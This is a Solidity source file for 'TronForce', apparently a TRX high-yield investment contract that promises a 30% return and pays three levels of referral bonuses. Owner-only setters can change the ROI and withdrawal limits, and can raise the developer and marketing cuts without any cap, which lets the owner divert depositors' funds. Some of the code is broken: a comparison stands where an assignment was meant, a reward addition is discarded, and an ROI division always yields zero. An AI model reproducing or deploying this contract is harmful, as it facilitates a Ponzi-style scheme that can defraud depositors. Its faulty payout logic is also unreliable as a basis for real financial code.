//SourceUnit: TronForce.sol

pragma solidity 0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Object {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        uint256 totalUserInvestment;
        uint256 lastDate;
        uint256 withdrawCount;
        uint256 lastInvest;
        uint256 deficitWithdraw;
        uint256 totalUserWithdraw;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract TronForce is Ownable {
    using SafeMath for uint256;
    uint256 public constant REFERENCE_RATE = 50; // Reference bonus: 5%
    uint256 public constant REFERENCE_LEVEL1_RATE = 100; // Level 1 bonus: 10%
    uint256 public constant REFERENCE_LEVEL2_RATE = 50; // Level 2 bonus: 5%
    uint256 public constant REFERENCE_LEVEL3_RATE = 30; // Level 3 bonus: 3%
    uint256 public constant REFERENCE_SELF_RATE = 0; 
    uint256 public constant DURATION = 3; // Cycle before reinvestment
    uint256 public constant CYCLE = 9; // withdraw cycle before reset
    uint256 public constant VARR = 1; // Total investment per time
    uint256 public constant PER = 100000000; // Percentage Calculation
    uint256 public constant ROI = 30000000; // Return on investment: 30%
    uint256 public constant MINIMUM = 50000000; //Minimum investment : 50 TRX
    uint256 public constant MAXIMUM = 10000000000; //Maximum investment : 10000 TRX
    uint256 public constant MAX_WITHDRAW = 20000000000; //Maximum withdrawal : 20000 TRX
    uint256 public constant MIN_WITHDRAW = 60000000; // Minimum withdrawal : 60 TRX
    uint256 public constant REFERRER_CODE = 1234; // Default referral code
    uint256 public constant CONTRACT_LIMIT = 800; // Contract balance

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;
    uint256 public  contract_balance;
    uint256 public _dailyLimit = 20; // daily withdrawal limit
    uint256 public _dailySum;
    bool public limitReached = false;
    uint256 private developerPercent_ = 50;
    uint256 private marketingPercent_ = 50;
    uint256 private _investorReward = 0;
    uint256 private duration_ = 3;
    uint256 private _newROI = 30;
    uint256 private max_withdraw_ = 20000000000; //Maximum withdraw : 20000 TRX
    uint256 private _investorCount = 0;

    address private developerAccount_;
    address private marketingAccount_;
    address private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Object.Investor) public uid2Investor;
    Object.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0);
        }
    }

    function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDailyLimit(uint256 _dailyLimita) public onlyOwner {
        require(_dailyLimita != uint256(0));
        _dailyLimit = _dailyLimita;
        _dailySum = getBalance().mul(_dailyLimit).div(100);
        limitReached = false;
    }

    function getDailyLimit() public view onlyOwner returns (uint256) {
        return _dailyLimit;
    }

    function getDailySum() public view returns (uint256) {
        return _dailySum;
    }

    function setRefCount(uint256 _investorCountt) public onlyOwner {
        _investorCount = _investorCountt;
    }

    function getRefCount() public view onlyOwner returns (uint256) {
        return _investorCount;
    }

    function setRewardAmount(uint256 _reward) public onlyOwner {
        _investorReward = _reward;
    }

    function getRewardAmount() public view onlyOwner returns (uint256) {
        return _investorReward;
    }

    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function setDuration(uint256 _newDuration) public onlyOwner {
        require(_newDuration != uint256(0));
        duration_ = _newDuration;
    }

    function setROI(uint256 _newROIi) public onlyOwner {
        require(_newROIi != uint256(0));
        _newROI = _newROIi;
    }

    function getROI() public view onlyOwner returns (uint256) {
        return _newROI;
    }

    function setDeveloperPercent(uint256 _percent) public onlyOwner {
        require(_percent != uint256(0));
        developerPercent_ = _percent;
    }

    function setMarketingPercent(uint256 _percent) public onlyOwner {
        require(_percent != uint256(0));
        marketingPercent_ = _percent;
    }
    
    function setMaxWithdraw(uint256 _amt) public onlyOwner {
        require(_amt != uint256(0));
        max_withdraw_ = _amt;
    }
    
    function getMaxWithdraw() public view onlyOwner returns (uint256) {
        return max_withdraw_;
    }

    function getDeveloperPercent() public view onlyOwner returns (uint256) {
        return developerPercent_;
    }
    
    function getMarketingPercent() public view onlyOwner returns (uint256) {
        return marketingPercent_;
    }
    
    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setReferenceAccount(address _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].withdrawCount = 0;
        uid2Investor[latestReferrerCode].totalUserInvestment = 0;
        uid2Investor[latestReferrerCode].deficitWithdraw = 0;
        uid2Investor[latestReferrerCode].totalUserWithdraw = 0;
        investmentPlans_.push(Object.Plan(_newROI.mul(10), 1)); 
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Object.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public onlyOwner view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Object.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.planCount,
        investor.totalUserInvestment,
        investor.lastDate,
        investor.withdrawCount,
        investor.deficitWithdraw,
        investor.totalUserWithdraw,
        currentDividends,
        newDividends
        );
    }


    function getInvestorInfoByUIDB(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Object.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.lastInvest,
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Object.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investments,
        currentDividends,
        investmentDates,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function invest(uint256 _referrerCode, uint256 _planId) public payable{
        uint256 _amount = msg.value;
        address _addr = msg.sender;

        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Object.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].isExpired = false;
        investor.planCount = investor.planCount.add(1);
        if(investor.totalUserInvestment == 0 && investor.withdrawCount > 0){
            investor.totalUserInvestment.add(_investorReward);
        }
        investor.totalUserInvestment = investor.totalUserInvestment.add(_amount);
        uint256 amountt = investor.totalUserInvestment.mul(_newROI.div(PER));
        investor.plans[planCount].currentDividends = amountt;

        _calculateReferrerReward(_amount, _referrerCode);

        totalInvestments_ = totalInvestments_.add(_amount);

        investor.lastDate = block.timestamp + 1 days;
        investor.lastInvest = _amount;

        uint256 developerPercentage = (_amount.mul(developerPercent_)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(marketingPercent_)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        
        emit onInvest(msg.sender, msg.value);

    }

    function withdraw() public payable {
        require(msg.value <= getBalance(), "Insufficent contract balance");
        require(msg.value <= max_withdraw_, "Maximum withdraw limit reached");
        require(limitReached == false, "Daily limit reached");
        require(msg.value == 0, "Withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[msg.sender];
        uint256 fAmount = 0;
        require(uid != 0, "No active investments");
        Object.Investor storage investor = uid2Investor[uid];
        require(block.timestamp > investor.lastDate, "Can not withdraw more than once in a day");
        require(( (investor.withdrawCount == 0) || ( (investor.withdrawCount > 0) && ((investor.planCount/investor.withdrawCount) > (1/duration_)) ) ), "Reinvest to continue withdrawal");
        
        fAmount = doWithdraw(uid);
        
        emit onWithdraw(msg.sender, fAmount*1000000);
    }

    function doWithdraw(uint256 uid) private returns(uint256) {
        Object.Investor storage investor = uid2Investor[uid];
        uint256 amount = investor.totalUserInvestment*_newROI/PER;
        uint256 withdrawalAmount = amount;
        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings/1000000;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }
        investor.withdrawCount = investor.withdrawCount.add(1);
        investor.totalUserWithdraw += withdrawalAmount;
        investor.lastDate = block.timestamp + 1 days;

        if(msg.value >= _dailySum){
            limitReached = true;
            _dailySum = 0;
        }
        else{
            limitReached = false;
            _dailySum -= (withdrawalAmount*1000000);
        }

        if(investor.deficitWithdraw + withdrawalAmount > max_withdraw_){
            withdrawalAmount = max_withdraw_;
            investor.deficitWithdraw = investor.deficitWithdraw.add(withdrawalAmount).sub(max_withdraw_);
            msg.sender.transfer(withdrawalAmount.mul(1000000));
        }
        else{
            withdrawalAmount = investor.deficitWithdraw + withdrawalAmount;
            investor.deficitWithdraw = 0;
            msg.sender.transfer(withdrawalAmount.mul(1000000));
        }
        
        if((investor.withdrawCount % CYCLE == 0)){
            investor.totalUserInvestment == 0;
        }
        return(withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _amount = _investment;

            if(_ref1 != 0){
                uint256 _bonus1 = _amount.mul(10).div(100);
                Object.Investor storage investor1 = uid2Investor[_ref1];
                investor1.availableReferrerEarnings = investor1.availableReferrerEarnings.add(_bonus1);
            }
            
            if(_ref2 != 0){
                uint256 _bonus2 = _amount.mul(5).div(100);
                Object.Investor storage investor2 = uid2Investor[_ref2];
                investor2.availableReferrerEarnings = investor2.availableReferrerEarnings.add(_bonus2);
            }
            
            if(_ref3 != 0){
                uint256 _bonus3 = _amount.mul(3).div(100);
                Object.Investor storage investor3 = uid2Investor[_ref3];
                investor3.availableReferrerEarnings = investor3.availableReferrerEarnings.add(_bonus3);
            }
        }

    }

}